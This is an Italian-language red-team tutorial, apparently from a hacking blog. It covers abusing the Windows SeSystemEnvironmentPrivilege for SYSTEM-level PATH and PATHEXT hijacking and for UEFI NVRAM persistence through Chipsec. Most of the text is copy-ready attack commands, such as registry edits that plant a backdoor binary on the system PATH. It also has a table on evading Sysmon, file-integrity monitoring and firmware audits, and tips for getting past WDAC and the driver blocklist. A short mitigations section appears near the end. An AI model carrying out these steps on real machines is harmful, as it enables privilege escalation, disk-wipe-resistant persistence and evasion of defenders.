---
title: 'SeSystemEnvironmentPrivilege: PATH Hijacking e Persistenza UEFI '
slug: sesystemenvironmentprivilege
description: 'Sfrutta SeSystemEnvironmentPrivilege per PATH hijacking e shell SYSTEM. Persistenza UEFI che sopravvive a wipe del disco. Guida Red Team con registry, Process Monitor e Chipsec.'
image: /SeSystemEnvironmentPrivilege (1).webp
draft: true
date: 2026-06-30T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - privilege-escalation
tags:
  - sesystemenvironmentprivilege
  - uefi-persistence
  - path-hijacking
---

Hai SeSystemEnvironmentPrivilege. Vettore A: aggiungi una directory al PATH di sistema, i processi SYSTEM caricano il tuo binary senza saperlo. Vettore B (APT): scrivi nel NVRAM del firmware — persistenza che sopravvive a wipe del disco e reinstallazione del SO.

***

## Quick Exploit — Vettore A (PATH Hijacking)

```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v Path /t REG_EXPAND_SZ /d "C:\temp\mytools;%PATH%" /f
```

Piazza il binary con il nome cercato da un processo SYSTEM:

```cmd
copy C:\temp\backdoor.exe C:\temp\mytools\target.exe
```

Al prossimo avvio del processo SYSTEM che cerca `target.exe` nel PATH:

```
nt authority\system
```

***

## Attack Chain — Vettore A

```
SeSystemEnvironmentPrivilege Enabled (token elevato)
  → Process Monitor: filtra WriteFile + SYSTEM + path controllato → identifica binary cercato
  → reg add PATH → aggiunge C:\temp\mytools in testa
  → copy backdoor.exe → C:\temp\mytools\[nome binary cercato]
  → aspetta riavvio servizio / task schedulata → SYSTEM
```

## Attack Chain — Vettore B (UEFI)

```
SeSystemEnvironmentPrivilege Enabled
  → bcdedit | findstr "winload" → winload.efi = UEFI → OK
  → python chipsec_main.py -m tools.uefi.var-list → enumera NVRAM
  → python chipsec_main.py -m tools.uefi.var-write -a VariableName,{GUID},Value
  → variabile scritta nel chip NVRAM → sopravvive a wipe disco + reinstall OS
```

***

## Tool Decision

| Obiettivo                            | Comando                                                                              |
| ------------------------------------ | ------------------------------------------------------------------------------------ |
| Aggiungi directory al PATH           | `reg add HKLM\...\Environment /v Path /d "C:\temp\mytools;%PATH%"`                   |
| Alternativa PowerShell (PATH lunghi) | `[System.Environment]::SetEnvironmentVariable("PATH", $newPath, "Machine")`          |
| Aggiungi estensioni eseguibili       | `reg add HKLM\...\Environment /v PATHEXT /d ".COM;.EXE;.BAT;.TXT"`                   |
| Identifica binary cercati da SYSTEM  | Process Monitor: `Operation=Process Start` + `User=SYSTEM` + `Result=NAME NOT FOUND` |
| Enumera variabili NVRAM UEFI         | `python chipsec_main.py -m tools.uefi.var-list`                                      |
| Scrivi variabile NVRAM               | `python chipsec_main.py -m tools.uefi.var-write -a Name,{GUID},Value`                |

***

## Cos'è SeSystemEnvironmentPrivilege

Permette di modificare le **variabili d'ambiente di sistema** a livello di registro (`HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment`) e, su sistemi UEFI, di leggere e scrivere le **variabili NVRAM del firmware** tramite le API `GetFirmwareEnvironmentVariable` / `SetFirmwareEnvironmentVariable`.

Assegnato per default agli **Administrators** (token elevato).

***

## Quando esiste

* **Administrators** (token elevato)
* **Account con policy custom** per gestione variabili d'ambiente di sistema

Verifica:

```cmd
whoami /priv
```

Cerchi:

```
SeSystemEnvironmentPrivilege    Modify firmware environment values    Enabled
```

Se vedi `Disabled` → token non elevato.

***

## VETTORE A — PATH Hijacking di Sistema

### Step 1 — Leggi il PATH attuale

```cmd
echo %PATH%
```

Oppure in PowerShell per output più leggibile:

```powershell
[System.Environment]::GetEnvironmentVariable("PATH", "Machine") -split ";"
```

Cerca: directory nel PATH che non esistono ancora (path fantasma), o directory scrivibili dal tuo account.

### Step 2 — Identifica i binary cercati senza path assoluto

Usa **Process Monitor** (Sysinternals): apri procmon, applica i filtri `Operation is Process Start`, `Result is NAME NOT FOUND`, e `User is SYSTEM`. Avvia o aspetta servizi/task schedulate e osserva quali binary cerca SYSTEM nel PATH senza trovarli.

Oppure cerca scheduled task che avviano comandi senza path assoluto:

```cmd
schtasks /query /fo LIST /v | findstr /i "Task To Run\|Run As User"
```

### Step 3 — Aggiungi la tua directory in testa al PATH

```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v Path /t REG_EXPAND_SZ /d "C:\temp\mytools;%PATH%" /f
```

Verifica la modifica:

```cmd
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v Path
```

In PowerShell (metodo alternativo più affidabile per PATH lunghi):

```powershell
$currentPath = [System.Environment]::GetEnvironmentVariable("PATH", "Machine")
$newPath = "C:\temp\mytools;" + $currentPath
[System.Environment]::SetEnvironmentVariable("PATH", $newPath, "Machine")
```

**Nota:** La modifica è persistente nel registry ma si applica solo ai nuovi processi avviati dopo la modifica. I processi già in esecuzione non aggiornano il PATH.

### Step 4 — Piazza il binary e aspetta l'esecuzione

Copia il binary nel path aggiunto, con il nome del binary cercato da SYSTEM:

```cmd
copy C:\temp\backdoor.exe C:\temp\mytools\target.exe
```

Al prossimo avvio del processo SYSTEM che cerca `target.exe` nel PATH:

```
nt authority\system
```

### Variante — PATHEXT hijacking

PATHEXT definisce le estensioni cercate come eseguibili nel PATH. Aggiungendo `.TXT` qualsiasi file `.txt` nel PATH diventa eseguibile:

```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v PATHEXT /t REG_SZ /d ".COM;.EXE;.BAT;.CMD;.VBS;.TXT;.JS" /f
```

***

## VETTORE B — UEFI NVRAM Persistence

### Prerequisito — Verifica che il sistema sia UEFI

```cmd
bcdedit | findstr "winload"
```

Output:

* `winload.efi` → sistema UEFI → vettore applicabile
* `winload.exe` → BIOS legacy → vettore non applicabile

Oppure:

```powershell
Confirm-SecureBootUEFI
```

`True` o `False` → UEFI presente (con o senza Secure Boot). Eccezione → BIOS legacy.

### Step 1 — Enumera le variabili NVRAM con Chipsec

**Chipsec** è lo strumento di riferimento per l'analisi firmware UEFI. Scaricabile da [chipsec/chipsec](https://github.com/chipsec/chipsec):

```cmd
python chipsec_main.py -m tools.uefi.var-list
```

Output: lista di tutte le variabili NVRAM con GUID, nome e dimensione.

### Step 2 — Leggi una variabile specifica

```cmd
python chipsec_main.py -m tools.uefi.var-read -a VariableName,{GUID}
```

### Step 3 — Scrivi una variabile nel firmware

```cmd
python chipsec_main.py -m tools.uefi.var-write -a VariableName,{GUID},Value
```

Le variabili scritte nel chip NVRAM **sopravvivono a**:

* Formattazione del disco
* Sostituzione del disco
* Reinstallazione del sistema operativo

Vengono eliminate solo da un aggiornamento firmware che sovrascrive il NVRAM, o da procedure specifiche del vendor hardware.

### Cosa protegge Secure Boot (e cosa no)

**Secure Boot protegge:** boot loader e kernel — devono essere firmati da una CA trusted.

**Secure Boot NON protegge:** variabili NVRAM generiche non legate al boot path.

Puoi scrivere nel NVRAM senza essere bloccato da Secure Boot. La parte complessa è la **weaponization** del payload UEFI — far sì che il firmware esegua il tuo codice durante il boot richiede competenze di firmware development avanzate.

**Riferimento storico:** LoJax (documentato da ESET nel 2018) è stato il primo malware UEFI documentato in the wild. Usava variabili NVRAM per installare un DXE driver nel firmware — persistenza che sopravviveva a qualsiasi operazione sull'OS. Analisi completa: [eset.com LoJax research](https://www.eset.com/int/about/newsroom/press-releases/eset-discovers-first-uefi-rootkit-in-the-wild/).

***

## Scenari reali

**Scheduled task che avvia comandi senza path assoluto** — una task SYSTEM esegue `cmd.exe` invece di `C:\Windows\System32\cmd.exe`. PATH modificato con `C:\temp\mytools` in prima posizione → tuo `cmd.exe` viene eseguito come SYSTEM.

**Installer software con fasi temporanee** — molti MSI estraggono componenti in `C:\temp\` come SYSTEM prima dell'installazione. Se cercano un binary nel PATH senza path assoluto, puoi intercettare l'esecuzione.

**UEFI persistence post-compromissione avanzata** — dopo aver ottenuto SYSTEM, installi una variabile NVRAM che persiste anche dopo il wipe del disco. Scenario da red team avanzato o simulazione APT.

***

## Errori comuni

**PATH aggiornato ma il processo SYSTEM usa ancora il binary originale** — I processi già in esecuzione non vedono il PATH aggiornato. Aspetta un riavvio del servizio o una nuova istanza: `sc stop NomeServizio && sc start NomeServizio`.

**Nessun processo SYSTEM cerca binary senza path assoluto** — Verifica con Process Monitor (filtro: `User=SYSTEM` + `Result=NAME NOT FOUND` + `Operation=Process Start`). Se non trovi nulla, il vettore non è praticabile in quell'ambiente.

**WDAC blocca il binary piazzato** — Il binary deve essere firmato o nella allowlist WDAC. Usa un wrapper LOLBin firmato o un binario legittimo con DLL hijacking.

**Chipsec bloccato dalla Vulnerable Driver Blocklist** — Chipsec richiede un driver kernel. Se HVCI o la blocklist lo blocca, cerca una versione non ancora nella lista su [loldrivers.io](https://www.loldrivers.io).

**`SetFirmwareEnvironmentVariable` → errore 1314** — SeSystemEnvironmentPrivilege non Enabled. Verifica: `whoami /priv | findstr SeSystemEnvironment`.

***

## Detection e bypass (Red Team view)

**PATH hijacking:**

| Cosa rileva il Blue Team                          | Come lo bypassa il Red Team                                                   |
| ------------------------------------------------- | ----------------------------------------------------------------------------- |
| Sysmon 13 — RegistryValueSet su chiave PATH       | Usa PowerShell `SetEnvironmentVariable` invece di `reg add` — pattern diverso |
| Processo SYSTEM che avvia binary da path inusuale | Usa un nome directory che imita path legittime: `C:\Windows\Servicing\`       |
| FIM sulla chiave PATH                             | Difficile evitare — opera durante finestre di manutenzione                    |

**UEFI NVRAM:**

| Cosa rileva il Blue Team                                   | Come lo bypassa il Red Team                                            |
| ---------------------------------------------------------- | ---------------------------------------------------------------------- |
| Nessun logging nativo per `SetFirmwareEnvironmentVariable` | Nulla da bypassare — operazione silenziosa per design                  |
| Chipsec audit periodico                                    | Usa variabili NVRAM con nomi che imitano quelli legittimi del firmware |

***

## Quando fallisce

**PATH hijacking:**

* Nessun processo SYSTEM cerca binary senza path assoluto → non praticabile. Verifica con Process Monitor.
* WDAC attivo → binary non firmato bloccato
* Processi già in esecuzione non aggiornano PATH → riavvia il servizio

**UEFI NVRAM:**

* Sistema BIOS legacy → API UEFI non disponibili
* Chipsec bloccato → cerca versione driver alternativa
* `SetFirmwareEnvironmentVariable` → errore 1314 → privilegio non Enabled

***

## Mitigazioni

**PATH hijacking:**

* Servizi e scheduled task devono usare path assoluti
* FIM sulla chiave registry PATH di sistema
* WDAC per bloccare binary non firmati

**UEFI NVRAM:**

* Intel Boot Guard / AMD PSP — hardware root of trust
* UEFI NVRAM write protection in BIOS setup (alcune piattaforme enterprise)
* Chipsec audit periodico: `python chipsec_main.py -m tools.uefi.var-list`

**Nota realistica:** PATH hijacking funziona quando c'è una scheduled task o un servizio che avvia comandi senza path assoluto — comune in software legacy e script di manutenzione. UEFI persistence è territorio APT: la scrittura è semplice, la weaponization del payload richiede competenze di firmware development avanzate.

***

## FAQ

**PATH hijacking funziona con WDAC attivo?**
Solo se il binary è firmato o nella allowlist. Senza WDAC funziona normalmente — e molti ambienti non hanno WDAC deployato.

**La UEFI persistence richiede accesso fisico?**
No — con SeSystemEnvironmentPrivilege scrivi nel NVRAM da un processo in esecuzione. La difficoltà è nella weaponization del payload UEFI, non nella scrittura della variabile.

**Come rimuovo una UEFI persistence se la trovo?**
Aggiornamento firmware che sovrascriva il NVRAM, o tool vendor-specifici. Reinstallare il SO non basta.

***

SeSystemEnvironmentPrivilege copre due scenari distinti: PATH hijacking pratico in qualsiasi pentest, UEFI persistence per simulazioni APT avanzate dove la persistenza deve sopravvivere a qualsiasi remediation OS-level.

***

**Articoli correlati:**

* [SeRestorePrivilege](https://hackita.it/articoli/serestoreprivilege) — binary replacement alternativo più diretto
* [SeLoadDriverPrivilege](https://hackita.it/articoli/seloaddriverprivilege) — kernel persistence via driver

**Riferimenti:** [Chipsec](https://github.com/chipsec/chipsec) · [LoJax research ESET](https://www.eset.com/int/about/newsroom/press-releases/eset-discovers-first-uefi-rootkit-in-the-wild/) · [Microsoft Docs](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/modify-firmware-environment-values)

Per assessment che includono analisi firmware e persistenza avanzata: [hackita.it/supporto](https://hackita.it/supporto)
